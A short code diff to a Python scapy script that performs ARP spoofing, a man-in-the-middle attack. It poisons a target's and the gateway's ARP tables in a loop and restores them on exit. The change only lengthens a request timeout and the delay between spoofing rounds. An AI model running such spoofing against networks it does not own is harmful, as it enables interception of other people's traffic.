@@ -15,7 +15,7 @@ def get_mac(ip):
     arp_req = scapy.ARP(pdst = ip)
     braodcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
     arp_broadcast_req = braodcast/arp_req
-    answered_list = scapy.srp(arp_broadcast_req, timeout = 2,verbose=False)[0]
+    answered_list = scapy.srp(arp_broadcast_req, timeout = 3,verbose=False)[0]
     return answered_list[0][1].hwsrc
 
 def spoof(tar_ip,spoof_ip):
@@ -36,7 +36,7 @@ try:
         spoof(Gateway,Target)
         counter = counter + 2
         print('\r[+] sent ' + str(counter) + ' packets',end='')
-        time.sleep(1)
+        time.sleep(2)
 except KeyboardInterrupt:
     print('  \nRESETTING ARP TABLES......\n')
     restore(Target,Gateway)
